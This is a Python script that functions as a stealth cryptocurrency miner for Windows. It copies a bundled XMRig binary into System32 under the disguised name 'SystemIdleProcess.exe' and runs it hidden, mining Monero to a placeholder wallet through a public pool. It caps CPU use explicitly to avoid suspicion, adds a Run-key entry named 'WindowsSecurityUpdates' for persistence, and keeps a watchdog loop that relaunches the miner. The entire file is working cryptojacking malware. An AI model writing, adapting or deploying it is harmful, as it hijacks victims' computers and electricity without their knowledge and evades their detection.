import subprocess
import os
import winreg
import time
import psutil
import shutil
import sys

# Get System32 path dynamically
system32_path = os.path.join(os.environ["SystemRoot"], "System32")
miner_name = "SystemIdleProcess.exe"
miner_full_path = os.path.join(system32_path, miner_name)

# XMRig command-line arguments
xmrig_args = [
    miner_full_path,
    "-o", "pool.supportxmr.com:3333",  # 🡐 your pool address here
    "-u", "YOUR_XMR_WALLET_ADDRESS",   # 🡐 your Monero wallet address here
    "-p", "x",                         # password (optional, often 'x')
    "--donate-level=1",                # donate level (1% to XMRig devs, you can set to 0 if savage)
    "--max-cpu-usage=50",              # Limit CPU usage to avoid suspicion
    "--background"                     # Run in the background mode (silent, no console)
]

def extract_xmrig():
    with open(os.path.join(sys._MEIPASS, 'xmrig.exe'), 'rb') as f:
        with open(miner_full_path, 'wb') as miner_file:
            miner_file.write(f.read())

def run_hidden():
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        subprocess.Popen(xmrig_args, startupinfo=si)
    except Exception as e:
        print(f"[Yuno Error] Couldn't start miner: {e}")

def add_to_startup(name, path):
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, name, 0, winreg.REG_SZ, path)
        winreg.CloseKey(reg_key)
    except Exception as e:
        print(f"[Yuno Error] Couldn't set registry: {e}")

def watchdog():
    while True:
        if not any(miner_name.lower() in proc.name().lower() for proc in psutil.process_iter()):
            run_hidden()
        time.sleep(30)

def setup_miner():
    try:
        if not os.path.exists(miner_full_path):
            extract_xmrig()
        add_to_startup("WindowsSecurityUpdates", miner_full_path)
        run_hidden()
    except Exception as e:
        print(f"[Yuno Error] Setup failed: {e}")

# --- MAIN ---
setup_miner()
watchdog()
